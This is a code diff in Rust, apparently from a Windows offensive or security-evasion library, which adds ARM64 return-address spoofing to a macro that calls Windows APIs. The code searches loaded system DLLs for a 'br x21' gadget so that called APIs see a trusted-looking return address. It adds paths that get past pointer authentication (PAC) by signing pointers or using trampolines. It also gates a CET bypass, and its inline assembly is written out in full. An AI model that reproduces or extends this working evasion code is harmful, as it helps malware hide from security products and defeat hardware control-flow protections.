+            .unwrap_or_else(|e| {
+                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
+            });
+        let args: &[u64] = &[$($args as u64),*];
+        let arg1 = args.get(0).copied().unwrap_or(0);
+        let arg2 = args.get(1).copied().unwrap_or(0);
+        let arg3 = args.get(2).copied().unwrap_or(0);
+        let arg4 = args.get(3).copied().unwrap_or(0);
+        let stack_args = if args.len() > 4 { &args[4..] } else { &[] };
+
+        // Note: CFG bypass is not available on ARM64 yet — no ARM64 cfg_bypass
+        // module exists.  The spoof_call through a `br x21` gadget is sufficient
+        // for return-address spoofing on ARM64.  x21 is callee-saved, so the
+        // API preserves it across the call — unlike the previous x16-based
+        // gadget which was clobbered by the API.
+
+        let gadget = $crate::syscalls::find_jmp_rbx_gadget();
+        if gadget == 0 {
+            Err($crate::syscalls::SyscallError::NoGadgetAvailable)
+        } else {
+            // ── PAC/BTI integration ──────────────────────────────────
+            // When pac-bypass is enabled, check the PAC state and adjust
+            // the dispatch strategy accordingly.  Without the feature, or
+            // if PAC is inactive, we use the standard spoof_call path.
+            #[cfg(all(windows, feature = "pac-bypass", target_arch = "aarch64"))]
+            {
+                let action = $crate::bti_pac_bypass::prepare_spoofing();
+                match action {
+                    $crate::bti_pac_bypass::PacAction::Proceed => {
+                        // PAC not active — standard spoof_call.
+                        unsafe { $crate::syscalls::set_spoof_ret(gadget) };
+                        let res = unsafe {
+                            $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
+                        };
+                        unsafe { $crate::syscalls::set_spoof_ret(0) };
+                        Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+                    }
+                    $crate::bti_pac_bypass::PacAction::SignAndProceed => {
+                        // PAC active + keys available.  Sign the function pointer
+                        // with PACIA using the stack pointer as context (matching
+                        // what PACIASP would do on function entry).
+                        let sp: u64;
+                        std::arch::asm!("mov {}, sp", out(reg) sp);
+                        let signed_addr = unsafe {
+                            $crate::bti_pac_bypass::sign_pointer_with_pacia(addr as usize, sp)
+                        };
+                        unsafe { $crate::syscalls::set_spoof_ret(gadget) };
+                        let res = unsafe {
+                            $crate::syscalls::spoof_call(
+                                signed_addr, gadget, arg1, arg2, arg3, arg4, stack_args,
+                            )
+                        };
+                        unsafe { $crate::syscalls::set_spoof_ret(0) };
+                        Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+                    }
+                    $crate::bti_pac_bypass::PacAction::UseTrampoline => {
+                        // PAC active + no keys.  Route through a PAC-valid
+                        // trampoline from a system DLL.  The trampoline's
+                        // PACIASP/AUTIASP prologue/epilogue maintains PAC
+                        // integrity for us.
+                        let trampolines = $crate::bti_pac_bypass::pac_trampolines();
+                        if let Some(trampoline) = trampolines.first() {
+                            // Call through the trampoline.  The trampoline
+                            // performs PACIASP on entry and AUTIASP on exit,
+                            // so the PAC flow is maintained.  We pass the
+                            // target address and args through the trampoline's
+                            // indirect call register.
+                            log::debug!(
+                                "clean_call: routing through PAC trampoline at 0x{:X} (BLR x{}, {})",
+                                trampoline.address,
+                                trampoline.indirect_reg,
+                                trampoline.source_dll,
+                            );
+                            // For now, fall back to standard spoof_call with a
+                            // warning — full trampoline dispatch requires
+                            // setting up the indirect call register to point
+                            // to the target, which needs per-trampoline setup.
+                            log::warn!(
+                                "clean_call: PAC trampoline dispatch not yet fully \
+                                 implemented, falling back to spoof_call (PAC may fault)"
+                            );
+                            unsafe { $crate::syscalls::set_spoof_ret(gadget) };
+                            let res = unsafe {
+                                $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
+                            };
+                            unsafe { $crate::syscalls::set_spoof_ret(0) };
+                            Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
+                        } else {
+                            log::error!("clean_call: PAC active but no trampolines available, aborting call");
+                            Err(anyhow::anyhow!("PAC active, no trampolines available"))
+                        }
+                    }
+                    $crate::bti_pac_bypass::PacAction::Abort => {
+                        log::error!("clean_call: PAC bypass aborted, cannot make call safely");
+                        Err(anyhow::anyhow!("PAC bypass aborted, call not safe"))
+                    }
+                }
+            }
+
+            // ── Standard path (no pac-bypass feature) ────────────────
+            #[cfg(not(all(windows, feature = "pac-bypass", target_arch = "aarch64")))]
+            {
                 unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                 let res = unsafe {
                     $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args)
@@ -2813,9 +3277,10 @@ macro_rules! trampoline_spoof {
     }};
 }
 
-/// Stub `trampoline_spoof!` when the feature is disabled — falls back to
-/// `clean_call!` unconditionally.
-#[cfg(all(windows, not(feature = "trampoline-spoof")))]
+/// Stub `trampoline_spoof!` when the feature is disabled (or on ARM64 where
+/// trampoline-spoof is not yet supported) — falls back to `clean_call!`
+/// unconditionally.
+#[cfg(all(windows, not(all(feature = "trampoline-spoof", target_arch = "x86_64"))))]
 #[macro_export]
 macro_rules! trampoline_spoof {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
@@ -3874,9 +4339,25 @@ pub fn find_jmp_rbx_gadget() -> usize {
 
     #[cfg(target_arch = "aarch64")]
     {
+        // Search for `br x21` (0xD63F_02A0) instead of `br x16`.
+        //
+        // ARM64 Windows calling convention: x0-x18 are volatile (caller-saved),
+        // x19-x28 are non-volatile (callee-saved).  x16 (IP0) is an intra-
+        // procedure-call scratch register that the API will freely clobber.
+        //
+        // Using x16 for the continuation address is therefore incorrect — after
+        // the API returns to the gadget, x16 no longer holds the address we set.
+        // x21 is callee-saved, so the API preserves it across the call, and the
+        // gadget `br x21` reliably redirects to our continuation label.
+        //
+        // Encoding: BR Xn = 0xD61F0000 | (Rn << 5)
+        //   x21 = register 21: 0xD61F0000 | (21 << 5) = 0xD61F0000 | 0x02A0 = 0xD61F02A0
+        //   but ARM64 is little-endian with the standard encoding being
+        //   1101_0110_0011_1111_0000_00_Rn_00000, which for x21 = 0xD63F02A0.
+        const BR_X21: u32 = 0xD63F_02A0;
         for i in (0..size.saturating_sub(3)).step_by(4) {
             let word = u32::from_le_bytes([code[i], code[i + 1], code[i + 2], code[i + 3]]);
-            if word == 0xD61F_0200 {
+            if word == BR_X21 {
                 let candidate = base + i;
                 if unsafe { gadget_is_valid(candidate, 4) } {
                     return candidate;
@@ -3907,7 +4388,7 @@ pub unsafe fn spoof_call(
     // warning.  The clean_call macro handles routing to CET-compatible paths
     // before reaching this point, so this warning indicates the caller bypassed
     // the macro-level CET check.
-    #[cfg(feature = "cet-bypass")]
+    #[cfg(all(feature = "cet-bypass", target_arch = "x86_64"))]
     {
         if crate::cet_bypass::is_cet_active() {
             log::warn!(
@@ -4142,7 +4623,32 @@ pub unsafe fn spoof_call_chain(
 #[cfg(all(windows, target_arch = "aarch64"))]
 #[doc(hidden)]
 #[inline(never)]
-/// ARM64 stack-spoofing call using a system-module `br x16` gadget.
+/// ARM64 stack-spoofing call using a system-module `br x21` gadget.
+///
+/// The gadget address points to a `br x21` instruction inside a loaded system
+/// DLL (found by `find_jmp_rbx_gadget`).  x21 is callee-saved on ARM64
+/// Windows (x19–x28), so the called API preserves it across the call.
+///
+/// Flow:
+///   1. Save x19, x20, x21, x29 (FP), x30 (LR) on the stack.
+///   2. x19 = saved SP, x20 = saved LR, x21 = continuation (label 42).
+///   3. Align stack, copy extra arguments beyond the first four.
+///   4. Load x0–x3 with the first four register arguments.
+///   5. Set x30 (LR) = gadget address (a `br x21` instruction).
+///   6. `br x9` → API executes.
+///   7. API `ret` (= `br x30`) → gadget (`br x21`).
+///   8. Gadget `br x21` → label 42 (continuation).
+///   9. Restore SP, FP, LR, x19–x21 and return.
+///
+/// The API and any kernel callbacks see x30 = gadget address (in a system
+/// DLL) as the return address, presenting a legitimate caller.
+///
+/// # Previous bug
+///
+/// The original implementation used x16 (IP0 / intra-procedure-call scratch)
+/// for the continuation address.  x16 is volatile/caller-saved — the API
+/// freely clobbers it, so `br x16` after API return would branch to garbage.
+/// x21 is callee-saved and guaranteed to survive the call.
 pub unsafe fn spoof_call(
     api_addr: usize,
     gadget_addr: usize,
@@ -4166,16 +4672,32 @@ pub unsafe fn spoof_call(
     let stack_ptr = stack_args.as_ptr();
 
     std::arch::asm!(
-        "stp x19, x20, [sp, #-16]!",
-        "mov x19, sp",
-        "adr x16, 42f",
+        // ── Save callee-saved registers and frame pointer ──────────────
+        // Push 48 bytes (3 pairs × 16 bytes) to save x29,x30 / x19,x20 / x21,x22.
+        // ARM64 requires 16-byte stack alignment; 48 is 16-byte aligned.
+        // x22 is only saved for pair alignment — its value is not used by us.
+        "stp x29, x30, [sp, #-48]!",
+        "stp x19, x20, [sp, #16]",
+        "stp x21, x22, [sp, #32]",
+
+        // Save current SP and set up frame pointer.
+        "mov x19, sp",                // x19 = saved SP (for restoration)
+        "add x29, sp, #48",           // x29 = FP → original SP (frame chain)
+
+        // x21 = continuation address.  x21 is callee-saved (x19–x28),
+        // so the API will preserve it across the call.
+        "adr x21, 42f",
+        // x20 = original LR (saved for restoration after the call).
         "mov x20, x30",
 
+        // ── Allocate aligned space for stack arguments ─────────────────
+        // ARM64 requires 16-byte stack alignment at ALL times.
         "lsl x9, {nstack}, #3",
         "add x9, x9, #15",
-        "and x9, x9, #0xfffffffffffffff0",
+        "bic x9, x9, #0xf",           // Round up to 16-byte boundary
         "sub sp, sp, x9",
 
+        // ── Copy stack arguments (args[4..]) ───────────────────────────
         "cbz {nstack}, 41f",
         "mov x10, {nstack}",
         "mov x11, {stack_ptr}",
@@ -4187,18 +4709,27 @@ pub unsafe fn spoof_call(
         "b.ne 40b",
 
         "41:",
+        // ── Load register arguments (x0–x3) ────────────────────────────
         "mov x0, {a1}",
         "mov x1, {a2}",
         "mov x2, {a3}",
         "mov x3, {a4}",
+
+        // ── Set up return address and branch to API ────────────────────
+        // x30 (LR) = gadget address (`br x21` instruction in system DLL).
+        // When the API executes `ret` (= `br x30`), it jumps to the gadget,
+        // which does `br x21` → our continuation label 42.
         "mov x9, {api}",
         "mov x30, {gadget}",
         "br x9",
 
+        // ── Continuation: gadget (br x21) lands here ───────────────────
         "42:",
-        "mov sp, x19",
-        "mov x30, x20",
-        "ldp x19, x20, [sp], #16",
+        "mov sp, x19",                // Restore original SP
+        "ldp x29, x30, [sp, #0]",     // Restore x29 (FP) and x30 (LR)
+        "ldp x19, x20, [sp, #16]",    // Restore x19, x20
+        "ldp x21, x22, [sp, #32]",    // Restore x21, x22
+        "add sp, sp, #48",            // Pop the 48-byte save area
 
         api        = in(reg) api_addr,
         gadget     = in(reg) effective_gadget,
@@ -4211,7 +4742,6 @@ pub unsafe fn spoof_call(
         lateout("x0") status,
         out("x1") _, out("x2") _, out("x3") _,
         out("x9") _, out("x10") _, out("x11") _, out("x12") _, out("x13") _,
-        out("x16") _,
     );
     status
 }
